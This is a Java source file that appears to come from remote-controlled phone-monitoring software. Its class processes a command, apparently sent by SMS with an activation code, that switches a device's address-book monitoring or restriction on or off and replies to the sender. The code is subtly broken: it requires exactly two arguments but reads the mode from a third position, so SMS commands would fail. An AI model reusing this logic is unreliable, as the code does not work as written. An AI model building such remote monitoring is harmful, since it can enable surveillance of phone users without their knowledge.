/**
 * 
 */
package com.vvt.remotecommandmanager.processor.addressbook;

import com.vvt.appcontext.AppContext;
import com.vvt.base.FxAddressbookMode;
import com.vvt.daemon_addressbook_manager.AddressbookManager;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.exceptions.FxNullNotAllowedException;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.logger.FxLog;
import com.vvt.remotecommandmanager.MessageManager;
import com.vvt.remotecommandmanager.ProcessingType;
import com.vvt.remotecommandmanager.RemoteCommandData;
import com.vvt.remotecommandmanager.RemoteCommandType;
import com.vvt.remotecommandmanager.exceptions.InvalidCommandFormatException;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.processor.ProcessingResult;
import com.vvt.remotecommandmanager.processor.RemoteCommandProcessor;
import com.vvt.remotecommandmanager.utils.RemoteCommandUtil;

/**
 * @author Aruna
 *
 */
public class SetAddressBookManagementProcessor extends RemoteCommandProcessor {
	private static final String TAG = "SetAddressBookManagementProcessor";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGE = Customization.ERROR;
	
	private static final int INDEX_OF_MANAGEMENT_MODE = 2;
	private static final int MANAGEMENT_MODE_OFF = 0;
	private static final int MANAGEMENT_MODE_MONITOR = 1;
	private static final int MANAGEMENT_MODE_RESTRICT = 2;
	
	private AddressbookManager mAddressbookManager;
	private String mRecipientNumber;
	private ProcessingResult mReplyMessage;
	private LicenseInfo mLicenseInfo;
	private StringBuilder mReplyMessageBuilder;
	
	public SetAddressBookManagementProcessor(AppContext appContext,AddressbookManager addressbookManager,
			FxEventRepository eventRepository,
			LicenseInfo licenseInfo) {
		
		super(appContext, eventRepository);
		
		mAddressbookManager = addressbookManager;
		mReplyMessage = new ProcessingResult();
		mLicenseInfo = licenseInfo;
	}

	@Override
	public ProcessingType getProcessingType() {
		 return ProcessingType.SYNC;
	}

	@Override
	protected void doProcessCommand(RemoteCommandData commandData)
			throws RemoteCommandException {
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ENTER ...");
		mReplyMessageBuilder = new StringBuilder();
		
		validateRemoteCommandData(commandData);
		
		if(mLicenseInfo.getLicenseStatus() == LicenseStatus.DISABLED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_DISABLED_WARNING).append(System.getProperty("line.separator"));
		} else if (mLicenseInfo.getLicenseStatus() == LicenseStatus.EXPIRED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_EXPIRED_WARNING).append(System.getProperty("line.separator"));
		}
		
		if(commandData.isSmsReplyRequired()) {
			mRecipientNumber = commandData.getSenderNumber();
		}
		
		int managementMode = Integer.parseInt(commandData.getArguments().get(INDEX_OF_MANAGEMENT_MODE));
		
		try {
			mAddressbookManager.stop();
			
			if(managementMode == MANAGEMENT_MODE_OFF) {
				mAddressbookManager.setMode(FxAddressbookMode.OFF);
			}
			else if(managementMode == MANAGEMENT_MODE_MONITOR) {
				mAddressbookManager.setMode(FxAddressbookMode.MONITOR);
				mAddressbookManager.startMonitor();
			}
			else if(managementMode == MANAGEMENT_MODE_RESTRICT) {
				mAddressbookManager.setMode(FxAddressbookMode.RESTRICTED);
				mAddressbookManager.startRestricted();
			}
			
			mReplyMessageBuilder.append(MessageManager.SET_ADDRESSBOOK_MANAGEMENT_COMPLETE);
			mReplyMessage.setIsSuccess(true);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
			
		} catch (FxNullNotAllowedException e) {
			if(LOGE) FxLog.e(TAG, e.getMessage());
			
			mReplyMessageBuilder.append(MessageManager.SET_ADDRESSBOOK_MANAGEMENT_ERROR);
			mReplyMessage.setIsSuccess(false);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
		}
		if(LOGV) FxLog.v(TAG, "doProcessCommand # IsSuccess : " + mReplyMessage.isSuccess());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ReplyMessage : " + mReplyMessage.getMessage());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # EXIT ...");
		return;
	}
	
	protected void validateRemoteCommandData(RemoteCommandData commandData) throws RemoteCommandException{
		
		if(commandData.getRmtCommandType() == RemoteCommandType.SMS_COMMAND) {
			if(commandData.getArguments().size() != 2) {
				throw new InvalidCommandFormatException();
			}
		
			//if invalid activation code it will throw exception.
			RemoteCommandUtil.validateActivationCode(commandData.getArguments().get(0), mLicenseInfo);
		}
		
		try{
			Integer.parseInt(commandData.getArguments().get(INDEX_OF_MANAGEMENT_MODE));
		}
		catch(NumberFormatException nfe) {
			if(LOGE) FxLog.e(TAG, "Erorr occured getting the Management Mode Index value");
			throw new InvalidCommandFormatException();
		}
		 
	}

	@Override
	protected String getRecipientNumber() {
		 return mRecipientNumber;
	}

	@Override
	protected ProcessingResult getReplyMessage() {
		return mReplyMessage;
	}

	

}
